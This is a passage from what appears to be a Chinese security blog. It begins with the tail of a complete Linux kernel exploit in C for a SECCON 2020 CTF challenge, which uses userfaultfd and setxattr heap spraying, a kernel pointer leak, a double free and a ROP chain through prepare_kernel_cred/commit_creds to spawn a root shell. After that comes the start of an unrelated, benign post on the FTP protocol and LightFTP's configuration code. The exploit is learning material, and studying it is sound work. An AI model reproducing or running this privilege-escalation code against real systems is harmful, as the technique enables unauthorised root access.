class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>             dev_fd;</span><br><span class="line"><span class="keyword">size_t</span>          seq_fd;</span><br><span class="line"><span class="keyword">size_t</span>          seq_fd_reserve[<span class="number">0x100</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>     *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span>   page_size;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> * msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">leak_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    </span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>); </span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)); </span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] msg error!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pop(&amp;kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak ptr: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    kernel_offset -= <span class="number">0xffffffff81c37bc0</span>;</span><br><span class="line">    kernel_base += kernel_offset;</span><br><span class="line">    </span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);;</span><br><span class="line">    uc.len = page_size;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">double_free_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    </span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>); </span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)); </span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] msg error!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pop(page);</span><br><span class="line"></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);;</span><br><span class="line">    uc.len = page_size;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span>  pop_rdi_ret = <span class="number">0xffffffff81034505</span>;</span><br><span class="line"><span class="keyword">size_t</span>  xchg_rax_rdi_ret = <span class="number">0xffffffff81d8df6d</span>;</span><br><span class="line"><span class="keyword">size_t</span>  mov_rdi_rax_pop_rbp_ret = <span class="number">0xffffffff8121f89a</span>;</span><br><span class="line"><span class="keyword">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81600a34</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">hijack_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    </span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>); </span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)); </span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] msg error!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">        close(seq_fd_reserve[i]);</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    xchg_rax_rdi_ret += kernel_offset;</span><br><span class="line">    mov_rdi_rax_pop_rbp_ret += kernel_offset;</span><br><span class="line">    prepare_kernel_cred = <span class="number">0xffffffff81069e00</span> + kernel_offset;</span><br><span class="line">    commit_creds = <span class="number">0xffffffff81069c10</span> + kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   prepare_kernel_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret;&quot;</span>    </span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] uid: %d gid: %d\n&quot;</span>, getuid(), getgid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);;</span><br><span class="line">    uc.len = page_size;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, <span class="number">0x57AC0001</span>, data) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;push!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, <span class="number">0x57AC0002</span>, data) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pop!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span>      data[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">char</span>        *uffd_buf_leak;</span><br><span class="line">    <span class="keyword">char</span>        *uffd_buf_uaf;</span><br><span class="line">    <span class="keyword">char</span>        *uffd_buf_hack;</span><br><span class="line">    <span class="keyword">int</span>         pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span>         shm_id;</span><br><span class="line">    <span class="keyword">char</span>        *shm_addr;</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/proc/stack&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd_reserve[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;seq reserve!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffd_buf_leak = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfault(uffd_buf_leak, page_size, leak_handler);</span><br><span class="line"></span><br><span class="line">    shm_id = shmget(<span class="number">114514</span>, <span class="number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmget!&quot;</span>);</span><br><span class="line">    shm_addr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (shm_addr &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmat!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    push(uffd_buf_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    uffd_buf_uaf = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfault(uffd_buf_uaf, page_size, double_free_handler);</span><br><span class="line"></span><br><span class="line">    push(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    pop(uffd_buf_uaf);</span><br><span class="line"></span><br><span class="line">    uffd_buf_hack = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, page_size * <span class="number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfault(uffd_buf_hack + page_size, page_size, hijack_handler);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, <span class="number">0xffffffff814d51c0</span> + kernel_offset);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(uffd_buf_hack + page_size - <span class="number">8</span>) = <span class="number">0xffffffff814d51c0</span> + kernel_offset;    <span class="comment">// add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;name&quot;</span>, uffd_buf_hack + page_size - <span class="number">8</span>, <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>多谢大佬的博客：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266898#h3-6">从 SECCON2020 一道 kernel pwn 看 userfaultfd + setxattr “堆占位”技术</a></p>
<p>学到了不少东西，但对 pt_regs 还不太熟悉</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/21/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9AFTP%E5%8D%8F%E8%AE%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/21/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9AFTP%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">网络相关知识：FTP协议</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-01-21 11:05:04 / Modified: 11:06:36" itemprop="dateCreated datePublished" datetime="2023-01-21T11:05:04+08:00">2023-01-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>FTP 协议简析</strong></p>
<p>FTP（File Transfer Protocol）是 TCP/IP 协议组中的协议之一，FTP 的工作就是完成两台计算机之间的拷贝</p>
<p>在 TCP/IP 协议中， 需要两个端口，一个是数据端口，一个是控制端口</p>
<ul>
<li>控制端口一般为21，而数据端口不一定是20，这和 FTP 的应用模式有关：<ul>
<li>如果是主动模式，应该为20</li>
<li>如果为被动模式，由服务器端和客户端协商而定</li>
</ul>
</li>
<li>FTP 协议要用到两个 TCP 连接：<ul>
<li>一个是命令链路，用来在 FTP 客户端与服务器之间传递命令</li>
<li>另一个是数据链路，用来上传或下载数据 </li>
</ul>
</li>
</ul>
<p><strong>主动模式与被动模式</strong></p>
<p>FTP 支持两种模式，一种方式叫做 Standard（也就是 PORT 方式，主动方式），一种是 Passive（也就是 PASV，被动方式），下面介绍一个这两种方式的工作原理：</p>
<p>主动 FTP ：</p>
<ul>
<li>命令连接：客户端向服务器的 FTP 端口（默认是21）发送连接请求，服务器接受连接，建立一条命令链路<ul>
<li>客户端 &gt;1024 端口 → 服务器 21 端口</li>
</ul>
</li>
<li>数据连接：客户端在命令链路上用 PORT 命令告诉服务器自己开启的端口，于是服务器从自己的 20 端口去连接客户端开启的端口并传输数据<ul>
<li>客户端 &gt;1024 端口 ← 服务器 20 端口</li>
</ul>
</li>
</ul>
<p>被动 FTP ：</p>
<ul>
<li>命令连接：客户端向服务器的 FTP 端口（默认是21）发送连接请求，服务器接受连接，建立一条命令链路 <ul>
<li>客户端 &gt;1024 端口 → 服务器 21 端口</li>
</ul>
</li>
<li>数据连接：客户端在命令链路上用 PASV 命令告诉服务器使用被动模式，于是服务器开启一个端口专门提供给客户端使用，然后客户端主动连接服务器端口来传输数据<ul>
<li>客户端 &gt;1024 端口 → 服务器 &gt; 1024 端口</li>
</ul>
</li>
</ul>
<p><strong>FTP 服务器的代码实现</strong></p>
<p>FTP 需要实现的功能如下：</p>
<ul>
<li>读取配置信息</li>
<li>与目标主机建立连接（使用 socket）</li>
<li>实现 FTP 命令集</li>
</ul>
<p>这里就以轻量级的 FTP 服务器 <code>LightFTP</code> 为例，来学习一下 FTP 服务器的代码实现</p>
<p><strong>LightFTP 读取配置信息</strong></p>
<p>在 <code>LightFTP</code> 中，使用 <code>config_parse</code> 函数来读取文件信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">config_parse</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *pcfg,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *section_name,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *key_name,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">char</span>            *value,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">unsigned</span> <span class="keyword">long</span>   value_size_max)</span></span></span><br></pre></td></tr></table></figure>
<p>该函数的参数如下：</p>
<ul>
<li><code>pcfg</code>：初始化函数 <code>config_init</code> 返回的缓冲区（配置文件 <code>fftp.conf</code> 中的内容被 Read 入其中）</li>
<li><code>section_name</code>：配置段名称，在配置文件 <code>fftp.conf</code> 中被大括号 <code>[]</code> 括起来的内容，用于区分某段配置（初始化配置名称为 <code>ftpconfig</code>）</li>
<li><code>key_name</code>：关键字名称，记录有在配置文件 <code>fftp.conf</code> 中写入的关键信息，程序初始化时会把等号 <code>=</code> 后面的内容读入内存</li>
<li><code>value</code>：用于外传数据的指针（程序会把目标 <code>key_name</code> 对应的值写入 <code>value</code> 中）</li>
<li><code>value_size_max</code>：用于表示 <code>value</code> 的最大值</li>
</ul>
<p>为了理解这些参数，我们需要其他代码进行辅助，就从 <code>config_init</code> 函数开始：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">config_init</span><span class="params">(<span class="keyword">char</span> *cfg_filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span>		f_config;</span><br><span class="line">	<span class="keyword">char</span>	*buffer = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">off_t</span>	fsz;</span><br><span class="line"></span><br><span class="line">	f_config = open(cfg_filename, O_RDONLY);</span><br><span class="line">	<span class="keyword">while</span> (f_config != <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		fsz = lseek(f_config, <span class="number">0L</span>, SEEK_END) + <span class="number">1</span>;</span><br><span class="line">		lseek(f_config, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">		buffer = x_malloc(fsz);</span><br><span class="line"></span><br><span class="line">		fsz = read(f_config, buffer, fsz);</span><br><span class="line">		buffer[fsz] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (f_config != <span class="number">-1</span>)</span><br><span class="line">		close(f_config);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序默认的 <code>cfg_filename</code> 就是 <code>fftp.conf</code></li>
<li>这个函数的功能就是把配置文件读取到本地内存 <code>buffer</code> 中，然后返回 <code>buffer</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">	cfg = config_init(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	cfg = config_init(CONFIG_FILE_NAME);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">	g_cfg.BindToInterface = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (config_parse(cfg, CONFIG_SECTION_NAME, <span class="string">&quot;interface&quot;</span>, textbuf, bufsize))</span><br><span class="line">		g_cfg.BindToInterface = inet_addr(textbuf);</span><br><span class="line"></span><br><span class="line">	g_cfg.ExternalInterface = inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (config_parse(cfg, CONFIG_SECTION_NAME, <span class="string">&quot;external_ip&quot;</span>, textbuf, bufsize))</span><br><span class="line">		g_cfg.ExternalInterface = inet_addr(textbuf);</span><br></pre></td></tr></table></figure>
<ul>
